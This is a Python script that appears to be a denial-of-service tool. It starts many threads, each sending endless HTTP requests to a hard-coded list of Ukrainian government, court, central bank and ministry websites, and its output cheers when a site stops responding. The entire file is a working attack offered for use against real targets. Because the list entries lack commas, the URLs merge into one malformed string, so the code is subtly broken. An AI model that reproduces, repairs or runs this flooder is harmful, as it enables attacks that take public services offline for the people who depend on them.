     
             
             
             
#!/usr/bin/env python3

from requests import get, ConnectionError
from threading import Thread
from sys import argv, exit
from getopt import getopt, GetoptError
from argparse import ArgumentParser

site_list = [
          'https://ukraine.ua/'     
          'https://court.gov.ua/'   
          'https://nazk.gov.ua'
          'https://okhtyrkamr.gov.ua/'     
          'https://snriu.gov.ua/'     
          'https://obuhivrda.gov.ua/'     
          'https://dsp.gov.ua/'     
          'https://nlmk.com'     
          'https://thedigital.gov.ua/'     
          'https://cip.gov.ua'     
          'https://hsc.gov.ua'     
          'https://ird.gov.ua/'     
          'https://mkip.gov.ua/'     
          'http://naas.gov.ua/'     
          'https://loda.gov.ua/'     
          'https://ombudsman.gov.ua/'     
          'https://mfa.gov.ua/'     
          'https://spravdi.gov.ua/'     
          'https://bank.gov.ua/'     
          'https://olexrada.gov.ua/'     
          'https://hsc.gov.ua/'     
          'https://znaimo.gov.ua/'     
          'https://kr.gov.ua/'     
          'https://mkrada.gov.ua/'    
          'https://diia.gov.ua/'     
          'https://cvk.gov.ua/'     
          'https://naqa.gov.ua/'     
          'https://imr.gov.ua/'     
          'http://nbuviap.gov.ua/'     
          'https://testportal.gov.ua/'     
          'https://kga.gov.ua/'     
          'https://nrcrm.gov.ua/'     
          'https://zpr.hsc.gov.ua'     
          'https://www.rnbo.gov.ua'     
          'https://www.president.gov.ua/'     
          'https://tripadvisor.mfa.gov.ua/'     
          'https://vue.gov.ua/'     
          'https://bs.dp.court.gov.ua/'     
          'http://www.kovelrada.gov.ua/'     
          'https://www.hniise.gov.ua/'     
          'https://bank.gov.ua/'    
          'https://an.dp.court.gov.ua/'   
          'https://mfa.gov.ua/'     
          'https://ml.od.court.gov.ua/'     
          'https://cnap.mlt.gov.ua/'     
          'https://www.nssmc.gov.ua/'
]

def request_all(quiet = False):

  def request(site):
    while True:
      try:
        response = get(site)
        message = f"'{site}' responded with a status of {response.status_code}"
      except ConnectionError:
        message = f"'{site}' didn't respond, seems to be down (which is the goal, so good job!)"

      if not quiet:
        print(message)

  for site in site_list:
    Thread(target=request, args=(site,)).start()

def main():
  parser = ArgumentParser()
  parser.add_argument('-t', '--threads', default=10, type=int, help='Amount of threads (default 10)')
  parser.add_argument('-q', '--quiet', action='store_true', help='Suppress output (default False)')
  args = parser.parse_args()

  for i in range(args.threads):
    Thread(target=request_all, args=(args.quiet,)).start()

if __name__ == '__main__':
  main()